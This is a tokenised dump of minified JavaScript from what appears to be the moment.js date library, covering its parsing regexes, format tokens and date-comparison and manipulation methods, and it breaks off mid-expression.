"this", ":", "e", ":", "c", "(", ")}", "),", "hn", "=", "[\"", "year", "\"", ",\"", "quarter", "\"", ",\"", "month", "\"", ",\"", "week", "\"", ",\"", "day", "\"", ",\"", "hour", "\"", ",\"", "minute", "\"", ",\"", "second", "\"", ",\"", "millisecond", "\"", "];", "Se", "(", "\"", "Z", "\"", ",\"", ":\"", "),", "Se", "(", "\"", "ZZ", "\"", ",\"", "\")", ",", "F", "(", "\"", "Z", "\"", ",", "St", ")", ",", "F", "(", "\"", "ZZ", "\"", ",", "St", ")", ",", "H", "(", "[\"", "Z", "\"", ",\"", "ZZ", "\"", "],", "function", "(", "e", ",", "t", ",", "n", ")", "{", "n", ".", "_useUTC", "=", "!", "0", ",", "n", ".", "_tzm", "=", "De", "(", "St", ",", "e", ")", "})", ";", "var", "cn", "=", "/(", "[\\", "+\\", "-]", "|\\", "d", "\\", "d", ")", "/", "gi", ";", "e", ".", "updateOffset", "=", "function", "(", "){", "};", "var", "fn", "=", "/^", "(\\", "-|", "\\+", ")?", "(?", ":(", "\\", "d", "*", ")[", ".", "]", ")?", "(\\", "d", "+", ")\\", ":(", "\\", "d", "+", ")(", "?:", "\\:", "(\\", "d", "+", ")(", "\\.", "\\", "d", "*", ")?", ")?", "$/", ",", "mn", "=", "/^", "(-", "|\\", "+)", "?", "P", "(", "?:", "([", "-+", "]?", "[", "0", "-", "9", ",", ".]", "*)", "Y", ")", "?(", "?:", "([", "-+", "]?", "[", "0", "-", "9", ",", ".]", "*)", "M", ")", "?(", "?:", "([", "-+", "]?", "[", "0", "-", "9", ",", ".]", "*)", "W", ")", "?(", "?:", "([", "-+", "]?", "[", "0", "-", "9", ",", ".]", "*)", "D", ")", "?(", "?:", "T", "(", "?:", "([", "-+", "]?", "[", "0", "-", "9", ",", ".]", "*)", "H", ")", "?(", "?:", "([", "-+", "]?", "[", "0", "-", "9", ",", ".]", "*)", "M", ")", "?(", "?:", "([", "-+", "]?", "[", "0", "-", "9", ",", ".]", "*)", "S", ")", "?)", "?$", "/;", "Te", ".", "fn", "=", "ve", ".", "prototype", ",", "Te", ".", "invalid", "=", "function", "(", "){", "return", "Te", "(", "NaN", ")", "};", "var", "_n", "=", "We", "(", "1", ",", "\"", "add", "\"", "),", "yn", "=", "We", "(", "-", "1", ",", "\"", "subtract", "\"", ");", "e", ".", "defaultFormat", "=", "\"", "YYYY", "-", "MM", "-", "DDTHH", ":", "mm", ":", "ssZ", "\"", ",", "e", ".", "defaultFormatUtc", "=", "\"", "YYYY", "-", "MM", "-", "DDTHH", ":", "mm", ":", "ss", "[", "Z", "]", "\";", "var", "gn", "=", "v", "(", "\"", "moment", "(", ").", "lang", "(", ")", "is", "deprecated", ".", "Instead", ",", "use", "moment", "(", ").", "localeData", "(", ")", "to", "get", "the", "language", "configuration", ".", "Use", "moment", "(", ").", "locale", "(", ")", "to", "change", "languages", ".", "\",", "function", "(", "e", ")", "{", "return", "void", "0", "=", "==", "e", "?", "this", ".", "localeData", "(", "):", "this", ".", "locale", "(", "e", ")", "})", ";", "P", "(", "0", ",", "[\"", "gg", "\"", ",", "2", "]", ",", "0", ",", "function", "(", "){", "return", "this", ".", "weekYear", "(", ")%", "100", "}", "),", "P", "(", "0", ",", "[\"", "GG", "\"", ",", "2", "]", ",", "0", ",", "function", "(", "){", "return", "this", ".", "isoWeekYear", "(", ")%", "100", "}", "),", "Ne", "(", "\"", "gggg", "\"", ",\"", "weekYear", "\"", "),", "Ne", "(", "\"", "ggggg", "\"", ",\"", "weekYear", "\"", "),", "Ne", "(", "\"", "GGGG", "\"", ",\"", "isoWeekYear", "\"", "),", "Ne", "(", "\"", "GGGGG", "\"", ",\"", "isoWeekYear", "\"", "),", "Y", "(", "\"", "weekYear", "\"", ",\"", "gg", "\"", "),", "Y", "(", "\"", "isoWeekYear", "\"", ",\"", "GG", "\"", "),", "T", "(", "\"", "weekYear", "\"", ",", "1", ")", ",", "T", "(", "\"", "isoWeekYear", "\"", ",", "1", ")", ",", "F", "(", "\"", "G", "\"", ",", "Mt", ")", ",", "F", "(", "\"", "g", "\"", ",", "Mt", ")", ",", "F", "(", "\"", "GG", "\"", ",", "mt", ",", "dt", ")", ",", "F", "(", "\"", "gg", "\"", ",", "mt", ",", "dt", ")", ",", "F", "(", "\"", "GGGG", "\"", ",", "pt", ",", "ct", ")", ",", "F", "(", "\"", "gggg", "\"", ",", "pt", ",", "ct", ")", ",", "F", "(", "\"", "GGGGG", "\"", ",", "wt", ",", "ft", ")", ",", "F", "(", "\"", "ggggg", "\"", ",", "wt", ",", "ft", ")", ",", "L", "(", "[\"", "gggg", "\"", ",\"", "ggggg", "\"", ",\"", "GGGG", "\"", ",\"", "GGGGG", "\"", "],", "function", "(", "e", ",", "t", ",", "n", ",", "s", ")", "{", "t", "[", "s", ".", "substr", "(", "0", ",", "2", ")", "]=", "g", "(", "e", ")", "})", ",", "L", "(", "[\"", "gg", "\"", ",\"", "GG", "\"", "],", "function", "(", "t", ",", "n", ",", "s", ",", "i", ")", "{", "n", "[", "i", "]", "=", "e", ".", "parseTwoDigitYear", "(", "t", ")", "})", ",", "P", "(", "\"", "Q", "\"", ",", "0", ",", "\"", "Qo", "\"", ",\"", "quarter", "\"", "),", "Y", "(", "\"", "quarter", "\"", ",\"", "Q", "\"", "),", "T", "(", "\"", "quarter", "\"", ",", "7", ")", ",", "F", "(", "\"", "Q", "\"", ",", "lt", ")", ",", "H", "(", "\"", "Q", "\"", ",", "function", "(", "e", ",", "t", ")", "{", "t", "[", "Tt", "]", "=", "3", "*", "(", "g", "(", "e", ")", "-", "1", ")", "})", ",", "P", "(", "\"", "D", "\"", ",[", "\"", "DD", "\"", ",", "2", "]", ",\"", "Do", "\"", ",\"", "date", "\"", "),", "Y", "(", "\"", "date", "\"", ",\"", "D", "\"", "),", "T", "(", "\"", "date", "\"", ",", "9", ")", ",", "F", "(", "\"", "D", "\"", ",", "mt", ")", ",", "F", "(", "\"", "DD", "\"", ",", "mt", ",", "dt", ")", ",", "F", "(", "\"", "Do", "\"", ",", "function", "(", "e", ",", "t", ")", "{", "return", "e", "?", "t", ".", "_dayOfMonthOrdinalParse", "|", "|", "t", ".", "_ordinalParse", ":", "t", ".", "_dayOfMonthOrdinalParseLenient", "}", "),", "H", "(", "[\"", "D", "\"", ",\"", "DD", "\"", "],", "bt", ")", ",", "H", "(", "\"", "Do", "\"", ",", "function", "(", "e", ",", "t", ")", "{", "t", "[", "bt", "]", "=", "g", "(", "e", ".", "match", "(", "mt", ")", "[", "0", "]", ")}", ");", "var", "pn", "=", "I", "(", "\"", "Date", "\"", ",!", "0", ")", ";", "P", "(", "\"", "DDD", "\"", ",[", "\"", "DDDD", "\"", ",", "3", "]", ",\"", "DDDo", "\"", ",\"", "dayOfYear", "\"", "),", "Y", "(", "\"", "dayOfYear", "\"", ",\"", "DDD", "\"", "),", "T", "(", "\"", "dayOfYear", "\"", ",", "4", ")", ",", "F", "(", "\"", "DDD", "\"", ",", "gt", ")", ",", "F", "(", "\"", "DDDD", "\"", ",", "ht", ")", ",", "H", "(", "[\"", "DDD", "\"", ",\"", "DDDD", "\"", "],", "function", "(", "e", ",", "t", ",", "n", ")", "{", "n", ".", "_dayOfYear", "=", "g", "(", "e", ")", "})", ",", "P", "(", "\"", "m", "\"", ",[", "\"", "mm", "\"", ",", "2", "]", ",", "0", ",", "\"", "minute", "\"", "),", "Y", "(", "\"", "minute", "\"", ",\"", "m", "\"", "),", "T", "(", "\"", "minute", "\"", ",", "14", ")", ",", "F", "(", "\"", "m", "\"", ",", "mt", ")", ",", "F", "(", "\"", "mm", "\"", ",", "mt", ",", "dt", ")", ",", "H", "(", "[\"", "m", "\"", ",\"", "mm", "\"", "],", "Wt", ")", ";", "var", "wn", "=", "I", "(", "\"", "Minutes", "\"", ",!", "1", ")", ";", "P", "(", "\"", "s", "\"", ",[", "\"", "ss", "\"", ",", "2", "]", ",", "0", ",", "\"", "second", "\"", "),", "Y", "(", "\"", "second", "\"", ",\"", "s", "\"", "),", "T", "(", "\"", "second", "\"", ",", "15", ")", ",", "F", "(", "\"", "s", "\"", ",", "mt", ")", ",", "F", "(", "\"", "ss", "\"", ",", "mt", ",", "dt", ")", ",", "H", "(", "[\"", "s", "\"", ",\"", "ss", "\"", "],", "Rt", ")", ";", "var", "vn", "=", "I", "(", "\"", "Seconds", "\"", ",!", "1", ")", ";", "P", "(", "\"", "S", "\"", ",", "0", ",", "0", ",", "function", "(", "){", "return", "~", "~(", "this", ".", "millisecond", "(", ")/", "100", ")", "})", ",", "P", "(", "0", ",", "[\"", "SS", "\"", ",", "2", "]", ",", "0", ",", "function", "(", "){", "return", "~", "~(", "this", ".", "millisecond", "(", ")/", "10", ")", "})", ",", "P", "(", "0", ",", "[\"", "SSS", "\"", ",", "3", "]", ",", "0", ",", "\"", "millisecond", "\"", "),", "P", "(", "0", ",", "[\"", "SSSS", "\"", ",", "4", "]", ",", "0", ",", "function", "(", "){", "return", "10", "*", "this", ".", "millisecond", "(", ")}", "),", "P", "(", "0", ",", "[\"", "SSSSS", "\"", ",", "5", "]", ",", "0", ",", "function", "(", "){", "return", "100", "*", "this", ".", "millisecond", "(", ")}", "),", "P", "(", "0", ",", "[\"", "SSSSSS", "\"", ",", "6", "]", ",", "0", ",", "function", "(", "){", "return", "1e3", "*", "this", ".", "millisecond", "(", ")}", "),", "P", "(", "0", ",", "[\"", "SSSSSSS", "\"", ",", "7", "]", ",", "0", ",", "function", "(", "){", "return", "1e4", "*", "this", ".", "millisecond", "(", ")}", "),", "P", "(", "0", ",", "[\"", "SSSSSSSS", "\"", ",", "8", "]", ",", "0", ",", "function", "(", "){", "return", "1e5", "*", "this", ".", "millisecond", "(", ")}", "),", "P", "(", "0", ",", "[\"", "SSSSSSSSS", "\"", ",", "9", "]", ",", "0", ",", "function", "(", "){", "return", "1e6", "*", "this", ".", "millisecond", "(", ")}", "),", "Y", "(", "\"", "millisecond", "\"", ",\"", "ms", "\"", "),", "T", "(", "\"", "millisecond", "\"", ",", "16", ")", ",", "F", "(", "\"", "S", "\"", ",", "gt", ",", "lt", ")", ",", "F", "(", "\"", "SS", "\"", ",", "gt", ",", "dt", ")", ",", "F", "(", "\"", "SSS", "\"", ",", "gt", ",", "ht", ")", ";", "var", "Mn", ";", "for", "(", "Mn", "=", "\"", "SSSS", "\"", ";", "Mn", ".", "length", "<", "=", "9", ";", "Mn", "+", "=\"", "S", "\"", ")", "F", "(", "Mn", ",", "vt", ")", ";", "for", "(", "Mn", "=", "\"", "S", "\"", ";", "Mn", ".", "length", "<", "=", "9", ";", "Mn", "+", "=\"", "S", "\"", ")", "H", "(", "Mn", ",", "Le", ")", ";", "var", "kn", "=", "I", "(", "\"", "Milliseconds", "\"", ",!", "1", ")", ";", "P", "(", "\"", "z", "\"", ",", "0", ",", "0", ",", "\"", "zoneAbbr", "\"", "),", "P", "(", "\"", "zz", "\"", ",", "0", ",", "0", ",", "\"", "zoneName", "\"", ");", "var", "Sn", "=", "m", ".", "prototype", ";", "Sn", ".", "add", "=", "_n", ",", "Sn", ".", "calendar", "=", "function", "(", "t", ",", "n", ")", "{", "var", "s", "=", "t", "|", "|", "pe", "(", "),", "i", "=", "Ye", "(", "s", ",", "this", ")", ".", "startOf", "(", "\"", "day", "\"", "),", "r", "=", "e", ".", "calendarFormat", "(", "this", ",", "i", ")", "||", "\"", "sameElse", "\"", ",", "a", "=", "n", "&", "&(", "k", "(", "n", "[", "r", "]", ")?", "n", "[", "r", "]", ".", "call", "(", "this", ",", "s", ")", ":", "n", "[", "r", "]", ");", "return", "this", ".", "format", "(", "a", "|", "|", "this", ".", "localeData", "(", ").", "calendar", "(", "r", ",", "this", ",", "pe", "(", "s", ")", "))", "},", "Sn", ".", "clone", "=", "function", "(", "){", "return", "new", "m", "(", "this", ")", "},", "Sn", ".", "diff", "=", "function", "(", "e", ",", "t", ",", "n", ")", "{", "var", "s", ",", "i", ",", "r", ";", "if", "(", "!", "this", ".", "isValid", "(", "))", "return", "NaN", ";", "if", "(", "!(", "s", "=", "Ye", "(", "e", ",", "this", ")", ").", "isValid", "(", "))", "return", "NaN", ";", "switch", "(", "i", "=", "6e4", "*", "(", "s", ".", "utcOffset", "(", ")-", "this", ".", "utcOffset", "(", "))", ",", "t", "=", "O", "(", "t", ")", "){", "case", "\"", "year", "\"", ":", "r", "=", "Ce", "(", "this", ",", "s", ")", "/", "12", ";", "break", ";", "case", "\"", "month", "\"", ":", "r", "=", "Ce", "(", "this", ",", "s", ")", ";", "break", ";", "case", "\"", "quarter", "\"", ":", "r", "=", "Ce", "(", "this", ",", "s", ")", "/", "3", ";", "break", ";", "case", "\"", "second", "\"", ":", "r", "=", "(", "this", "-", "s", ")", "/", "1e3", ";", "break", ";", "case", "\"", "minute", "\"", ":", "r", "=", "(", "this", "-", "s", ")", "/", "6e4", ";", "break", ";", "case", "\"", "hour", "\"", ":", "r", "=", "(", "this", "-", "s", ")", "/", "36e5", ";", "break", ";", "case", "\"", "day", "\"", ":", "r", "=", "(", "this", "-", "s", "-", "i", ")", "/", "864e5", ";", "break", ";", "case", "\"", "week", "\"", ":", "r", "=", "(", "this", "-", "s", "-", "i", ")", "/", "6048e5", ";", "break", ";", "default", ":", "r", "=", "this", "-", "s", "}", "return", "n", "?", "r", ":", "y", "(", "r", ")", "},", "Sn", ".", "endOf", "=", "function", "(", "e", ")", "{", "return", "void", "0", "=", "==", "(", "e", "=", "O", "(", "e", ")", ")|", "|\"", "millisecond", "\"", "==", "=", "e", "?", "this", ":", "(\"", "date", "\"", "==", "=", "e", "&", "&(", "e", "=", "\"", "day", "\"", "),", "this", ".", "startOf", "(", "e", ")", ".", "add", "(", "1", ",", "\"", "isoWeek", "\"", "==", "=", "e", "?", "\"", "week", "\"", ":", "e", ")", ".", "subtract", "(", "1", ",", "\"", "ms", "\"", "))", "},", "Sn", ".", "format", "=", "function", "(", "t", ")", "{", "t", "|", "|(", "t", "=", "this", ".", "isUtc", "(", ")?", "e", ".", "defaultFormatUtc", ":", "e", ".", "defaultFormat", ")", ";", "var", "n", "=", "R", "(", "this", ",", "t", ")", ";", "return", "this", ".", "localeData", "(", ").", "postformat", "(", "n", ")", "},", "Sn", ".", "from", "=", "function", "(", "e", ",", "t", ")", "{", "return", "this", ".", "isValid", "(", ")&", "&(", "_", "(", "e", ")", "&&", "e", ".", "isValid", "(", ")|", "|", "pe", "(", "e", ")", ".", "isValid", "(", "))", "?", "Te", "(", "{", "to", ":", "this", ",", "from", ":", "e", "}", ").", "locale", "(", "this", ".", "locale", "(", "))", ".", "humanize", "(", "!", "t", ")", ":", "this", ".", "localeData", "(", ").", "invalidDate", "(", ")}", ",", "Sn", ".", "fromNow", "=", "function", "(", "e", ")", "{", "return", "this", ".", "from", "(", "pe", "(", "),", "e", ")", "},", "Sn", ".", "to", "=", "function", "(", "e", ",", "t", ")", "{", "return", "this", ".", "isValid", "(", ")&", "&(", "_", "(", "e", ")", "&&", "e", ".", "isValid", "(", ")|", "|", "pe", "(", "e", ")", ".", "isValid", "(", "))", "?", "Te", "(", "{", "from", ":", "this", ",", "to", ":", "e", "}", ").", "locale", "(", "this", ".", "locale", "(", "))", ".", "humanize", "(", "!", "t", ")", ":", "this", ".", "localeData", "(", ").", "invalidDate", "(", ")}", ",", "Sn", ".", "toNow", "=", "function", "(", "e", ")", "{", "return", "this", ".", "to", "(", "pe", "(", "),", "e", ")", "},", "Sn", ".", "get", "=", "function", "(", "e", ")", "{", "return", "e", "=", "O", "(", "e", ")", ",", "k", "(", "this", "[", "e", "]", ")?", "this", "[", "e", "]", "()", ":", "this", "}", ",", "Sn", ".", "invalidAt", "=", "function", "(", "){", "return", "d", "(", "this", ")", ".", "overflow", "}", ",", "Sn", ".", "isAfter", "=", "function", "(", "e", ",", "t", ")", "{", "var", "n", "=", "_", "(", "e", ")", "?", "e", ":", "pe", "(", "e", ")", ";", "return", "!", "(!", "this", ".", "isValid", "(", ")|", "|!", "n", ".", "isValid", "(", "))", "&&", "(\"", "millisecond", "\"", "==", "=(", "t", "=", "O", "(", "s", "(", "t", ")", "?\"", "millisecond", "\"", ":", "t", ")", ")?", "this", ".", "valueOf", "(", ")>", "n", ".", "valueOf", "(", "):", "n", ".", "valueOf", "(", ")<", "this", ".", "clone", "(", ").", "startOf", "(", "t", ")", ".", "valueOf", "(", "))", "},", "Sn", ".", "isBefore", "=", "function", "(", "e", ",", "t", ")", "{", "var", "n", "=", "_", "(", "e", ")", "?", "e", ":", "pe", "(", "e", ")", ";", "return", "!", "(!", "this", ".", "isValid", "(", ")|", "|!", "n", ".", "isValid", "(", "))", "&&", "(\"", "millisecond", "\"", "==", "=(", "t", "=", "O", "(", "s", "(", "t", ")", "?\"", "millisecond", "\"", ":", "t", ")", ")?", "this", ".", "valueOf", "(", ")<", "n", ".", "valueOf", "(", "):", "this", ".", "clone", "(", ").", "endOf", "(", "t", ")", ".", "valueOf", "(", ")<", "n", ".", "valueOf", "(", "))", "},", "Sn", ".", "isBetween", "=", "function", "(", "e", ",", "t", ",", "n", ",", "s", ")", "{", "return", "(", "\"(", "\"=", "==", "(", "s", "=", "s", "|", "|\"", "()", "\")", "[", "0", "]", "?", "this", ".", "isAfter", "(", "e", ",", "n", ")", ":!", "this", ".", "isBefore", "(", "e", ",", "n", ")", ")&", "&(", "\")", "\"=", "==", "s", "[", "1", "]", "?", "this", ".", "isBefore", "(", "t", ",", "n", ")", ":!", "this", ".", "isAfter", "(", "t", ",", "n", ")", ")}", ",", "Sn", ".", "isSame", "=", "function", "(", "e", ",", "t", ")", "{", "var", "n", ",", "s", "=", "_", "(", "e", ")", "?", "e", ":", "pe", "(", "e", ")", ";", "return", "!", "(!", "this", ".", "isValid", "(", ")|", "|!", "s", ".", "isValid", "(", "))", "&&", "(\"", "millisecond", "\"", "==", "=(", "t", "=", "O", "(", "t", "|", "|\"", "millisecond", "\"", "))", "?", "this", ".", "valueOf", "(", ")=", "==", "s", ".", "valueOf", "(", "):", "(", "n", "=", "s", ".", "valueOf", "(", "),", "this", ".", "clone", "(", ").", "startOf", "(", "t", ")", ".", "valueOf", "(", ")<", "=", "n", "&", "&", "n", "<", "=", "this", ".", "clone", "(", ").", "endOf", "(", "t", ")", ".", "valueOf", "(", "))", ")}", ",", "Sn", ".", "isSameOrAfter", "=", "function", "(", "e", ",", "t", ")", "{", "return", "this", ".", "isSame", "(", "e", ",", "t", ")", "||", "this", ".", "isAfter", "(", "e", ",", "t", ")", "},", "Sn", ".", "isSameOrBefore", "=", "function", "(", "e", ",", "t", ")", "{", "return", "this", ".", "isSame", "(", "e", ",", "t", ")", "||", "this", ".", "isBefore", "(", "e", ",", "t", ")", "},", "Sn", ".", "isValid", "=", "function", "(", "){", "return", "h", "(", "this", ")", "},", "Sn", ".", "lang", "=", "gn", ",", "Sn", ".", "locale", "=", "Fe", ",", "Sn", ".", "localeData", "=", "Ue", ",", "Sn", ".", "max", "=", "dn", ",", "Sn", ".", "min", "=", "ln", ",", "Sn", ".", "parsingFlags", "=", "function", "(", "){", "return", "u", "(", "{}", ",", "d", "(", "this", ")", ")}", ",", "Sn", ".", "set", "=", "function", "(", "e", ",", "t", ")", "{", "if", "(", "\"", "object", "\"", "==", "typeof", "e", ")", "for", "(", "var", "n", "=", "function", "(", "e", ")", "{", "var", "t", "=", "[]", ";", "for", "(", "var", "n", "in", "e", ")", "t", ".", "push", "(", "{", "unit", ":", "n", ",", "priority", ":", "it", "[", "n", "]", "})", ";", "return", "t", ".", "sort", "(", "function", "(", "e", ",", "t", ")", "{", "return", "e", ".", "priority", "-", "t", ".", "priority", "}", "),", "t", "}", "(", "e", "=", "x", "(", "e", ")", "),", "s", "=", "0", ";", "s", "<", "n", ".", "length", ";", "s", "+", "+)", "this", "[", "n", "[", "s", "]", ".", "unit", "]", "(", "e", "[", "n", "[", "s", "]", ".", "unit", "]", ");", "else", "if", "(", "e", "=", "O", "(", "e", ")", ",", "k", "(", "this", "[", "e", "]", "))", "return", "this", "[", "e", "]", "(", "t", ")", ";", "return", "this", "}", ",", "Sn", ".", "startOf", "=", "function", "(", "e", ")", "{", "switch", "(", "e", "=", "O", "(", "e", ")", "){", "case", "\"", "year", "\"", ":", "this", ".", "month", "(", "0", ")", ";", "case", "\"", "quarter", "\"", ":", "case", "\"", "month", "\"", ":", "this", ".", "date", "(", "1", ")", ";", "case", "\"", "week", "\"", ":", "case", "\"", "isoWeek", "\"", ":", "case", "\"", "day", "\"", ":", "case", "\"", "date", "\"", ":", "this", ".", "hours", "(", "0", ")", ";", "case", "\"", "hour", "\"", ":", "this", ".", "minutes", "(", "0", ")", ";", "case", "\"", "minute", "\"", ":", "this", ".", "seconds", "(", "0", ")", ";", "case", "\"", "second", "\"", ":", "this", ".", "milliseconds", "(", "0", ")", "}", "return", "\"", "week", "\"", "==", "=", "e", "&", "&", "this", ".", "weekday", "(", "0", ")", ",\"", "isoWeek", "\"", "==", "=", "e", "&", "&", "this", ".", "isoWeekday", "(", "1", ")", ",\"", "quarter", "\"", "==", "=", "e", "&", "&", "this", ".", "month", "(", "3", "*", "Math", ".", "floor", "(", "this", ".", "month", "(", ")/", "3", ")", "),", "this", "}", ",", "Sn", ".", "subtract", "=", "yn", ",", "Sn", ".", "toArray", "=", "function", "(", "){", "return", "[", "this", ".", "year", "(", "),", "this", ".", "month", "(", "),", "this", ".", "date", "(", "),", "this", ".", "hour", "(", "),", "this", ".", "minute", "(", "),", "this", ".", "second", "(", "),", "this", ".", "millisecond", "(", ")]", "},", "Sn", ".", "toObject", "=", "function", "(", "){", "return", "{", "years", ":", "this", ".", "year", "(", "),", "months", ":", "this", ".", "month", "(", "),", "date", ":", "this", ".", "date", "(", "),", "hours", ":", "this", ".", "hours", "(", "),", "minutes", ":", "this", ".", "minutes", "(", "),", "seconds", ":", "this", ".", "seconds", "(", "),", "milliseconds", ":", "this", ".", "milliseconds", "(", ")}", "},", "Sn", ".", "toDate", "=", "function", "(", "){", "return", "new", "Date", "(", "this", ".", "valueOf", "(", "))", "},", "Sn", ".", "toISOString", "=", "function", "(", "){", "if", "(", "!", "this", ".", "isValid", "(", "))", "return", "null", ";", "var", "e", "=", "this", ".", "clone", "(", ").", "utc", "(", ");", "return", "e", ".", "year", "(", ")<", "0", "|", "|", "e", ".", "year", "(", ")>", "9999", "?", "R", "(", "e", ",", "\"", "YYYYYY", "-", "MM", "-", "DD", "[", "T", "]", "HH", ":", "mm", ":", "ss", ".", "SSS", "[", "Z", "]", "\")", ":", "k", "(", "Date", ".", "prototype", ".", "toISOString", ")", "?", "this", ".", "toDate", "(", ").", "toISOString", "(", "):", "R", "(", "e", ",", "\"", "YYYY", "-", "MM", "-", "DD", "[", "T", "]", "HH", ":", "mm", ":", "ss", ".", "SSS", "[", "Z", "]", "\")", "},", "Sn", ".", "inspect", "=", "function", "(", "){", "if", "(", "!", "this", ".", "isValid", "(", "))", "return", "\"", "moment", ".", "invalid", "(", "/*", "\"", "+", "this", ".", "_i", "+", "\"", "*", "/)", "\";", "var", "e", "=", "\"", "moment", "\"", ",", "t", "=", "\"\"", ";", "this", ".", "isLocal", "(", ")|", "|(", "e", "=", "0", "=", "==", "this", ".", "utcOffset", "(", ")?", "\"", "moment", ".", "utc", "\"", ":\"", "moment", ".", "parseZone", "\"", ",", "t", "=", "\"", "Z", "\"", ");", "var", "n", "=", "\"[", "\"+", "e", "+", "'(", "\"]", "',", "s", "=", "0", "<", "=", "this", ".", "year", "(", ")&", "&", "this", ".", "year", "(", ")<", "=", "9999", "?", "\"", "YYYY", "\"", ":\"", "YYYYYY", "\"", ",", "i", "=", "t", "+", "'[", "\")", "]'", ";", "return", "this", ".", "format", "(", "n", "+", "s", "+", "\"-", "MM", "-", "DD", "[", "T", "]", "HH", ":", "mm", ":", "ss", ".", "SSS", "\"", "+", "i", ")", "},", "Sn", ".", "toJSON", "=", "function", "(", "){", "return", "this", ".", "isValid", "(", ")?", "this", ".", "toISOString", "(", "):", "null", "}", ",", "Sn", ".", "toString", "=", "function", "(", "){", "return", "this", ".", "clone", "(", ").", "locale", "(", "\"", "en", "\"", ").", "format", "(", "\"", "ddd", "MMM", "DD", "YYYY", "HH", ":", "mm", ":", "ss", "[", "GMT", "]", "ZZ", "\"", ")}", ",", "Sn", ".", "unix", "=", "function", "(", "){", "return", "Math", ".", "floor", "(", "this", ".", "valueOf", "(", ")/", "1e3", ")", "},", "Sn", ".", "valueOf", "=", "function", "(", "){", "return", "this", ".", "_d", ".", "valueOf", "(", ")-", "6e4", "*", "(", "this", ".", "_offset", "|", "|", "0", ")", "},", "Sn", ".", "creationData", "=", "function", "(", "){", "return", "{", "input", ":", "this", ".", "_i", ",", "format", ":", "this", ".", "_f", ",", "locale", ":", "this", ".", "_locale", ",", "isUTC", ":", "this", ".", "_isUTC", ",", "strict", ":", "this", ".", "_strict", "}", "},", "Sn", ".", "year", "=", "Ht", ",", "Sn", ".", "isLeapYear", "=", "function", "(", "){", "return", "j", "(", "this", ".", "year", "(", "))", "},", "Sn", ".", "weekYear", "=", "function", "(", "e", ")", "{", "return", "He", ".", "call", "(", "this", ",", "e", ",", "this", ".", "week", "(", "),", "this", ".", "weekday", "(", "),", "this", ".", "localeData", "(", ").", "_week", ".", "dow", ",", "this", ".", "localeData", "(", ").", "_week", ".", "doy", ")", "},", "Sn", ".", "isoWeekYear", "=", "function", "(", "e", ")", "{", "return", "He", ".", "call", "(", "this", ",", "e", ",", "this", ".", "isoWeek", "(", "),", "this", ".", "isoWeekday", "(", "),", "1", ",", "4", ")", "},", "Sn", ".", "quarter", "=", "Sn", ".", "quarters", "=", "function", "(", "e", ")", "{", "return", "null", "=", "=", "e", "?", "Math", ".", "ceil", "(", "(", "this", ".", "month", "(", ")+", "1", ")", "/", "3", ")", ":", "this", ".", "month", "(", "3", "*", "(", "e", "-", "1", ")", "+", "this", ".", "month", "(", ")%", "3", ")", "},", "Sn", ".", "month", "=", "$,", "Sn", ".", "daysInMonth", "=", "function", "(", "){", "return", "z", "(", "this", ".", "year", "(", "),", "this", ".", "month", "(", "))", "},", "Sn", ".", "week", "=", "Sn", ".", "weeks", "=", "function", "(", "e", ")", "{", "var", "t", "=", "this", ".", "localeData", "(", ").", "week", "(", "this", ")", ";", "return", "null", "=", "=", "e", "?", "t", ":", "this", ".", "add", "(", "7", "*", "(", "e", "-", "t", ")", ",\"", "d", "\"", ")}", ",", "Sn", ".", "isoWeek", "=", "Sn", ".", "isoWeeks", "=", "function", "(", "e", ")", "{", "var", "t", "=", "X", "(", "this", ",", "1", ",", "4", ")", ".", "week", ";", "return", "null", "=", "=", "e", "?", "t", ":", "this", ".", "add", "(", "7", "*", "(", "e", "-", "t", ")", ",\"", "d", "\"", ")}", ",", "Sn", ".", "weeksInYear", "=", "function", "(", "){", "var", "e", "=", "this", ".", "localeData", "(", ").", "_week", ";", "return", "K", "(", "this", ".", "year", "(", "),", "e", ".", "dow", ",", "e", ".", "doy", ")", "},", "Sn", ".", "isoWeeksInYear", "=", "function", "(", "){", "return", "K", "(", "this", ".", "year", "(", "),", "1", ",", "4", ")", "},", "Sn", ".", "date", "=", "pn", ",", "Sn", ".", "day", "=", "Sn", ".", "days", "=", "function", "(", "e", ")", "{", "if", "(", "!", "this", ".", "isValid", "(", "))", "return", "null", "!", "=", "e", "?", "this", ":", "NaN", ";", "var", "t", "=", "this", ".", "_isUTC", "?", "this", ".", "_d", ".", "getUTCDay", "(", "):", "this", ".", "_d", ".", "getDay", "(", ");", "return", "null", "!", "=", "e", "?", "(", "e", "=", "function", "(", "e", ",", "t", ")", "{", "return", "\"", "string", "\"", "!=", "typeof", "e", "?", "e", ":", "isNaN", "(", "e", ")", "?\"", "number", "\"", "==", "typeof", "(", "e", "=", "t", ".", "weekdaysParse", "(", "e", ")", ")?", "e", ":", "null", ":", "parseInt", "(", "e", ",", "10", ")", "}(", "e", ",", "this", ".", "localeData", "(", "))", ",", "this", ".", "add", "(", "e", "-", "t", ",", "\"", "d", "\"", "))", ":", "t", "}", ",", "Sn", ".", "weekday", "=", "function", "(", "e", ")", "{", "if", "(", "!", "this", ".", "isValid", "(", "))", "return", "null", "!", "=", "e", "?", "this", ":", "NaN", ";", "var", "t", "=", "(", "this", ".", "day", "(", ")+", "7", "-", "this", ".", "localeData", "(", ").", "_week", ".", "dow", ")", "%", "7", ";", "return", "null", "=", "=", "e", "?", "t", ":", "this", ".", "add", "(", "e", "-", "t", ",", "\"", "d", "\"", ")}", ",", "Sn", ".", "isoWeekday", "=", "function", "(", "e", ")", "{", "if", "(", "!", "this", ".", "isValid", "(", "))", "return", "null", "!", "=", "e", "?", "this", ":", "NaN", ";", "if", "(", "null", "!", "=", "e", ")", "{", "var", "t", "=", "function", "(", "e", ",", "t", ")", "{", "return", "\"", "string", "\"", "==", "typeof", "e", "?", "t", ".", "weekdaysParse", "(", "e", ")", "%", "7", "|", "|", "7", ":", "isNaN", "(", "e", ")", "?", "null", ":", "e", "}", "(", "e", ",", "this", ".", "localeData", "(", "))", ";", "return", "this", ".", "day", "(", "this", ".", "day", "(", ")%", "7", "?", "t", ":", "t", "-", "7", ")", "}", "return", "this", ".", "day", "(", ")|", "|", "7", "}", ",", "Sn", ".", "dayOfYear", "=", "function", "(", "e", ")", "{", "var", "t", "=", "Math", ".", "round", "(", "(", "this", ".", "clone", "(", ").", "startOf", "(", "\"", "day", "\"", ")-", "this", ".", "clone", "(", ").", "startOf", "(", "\"", "year", "\"", "))", "/", "864e5", ")", "+", "1", ";", "return", "null", "=", "=", "e", "?", "t", ":", "this", ".", "add", "(", "e", "-", "t", ",", "\"", "d", "\"", ")}", ",", "Sn", ".", 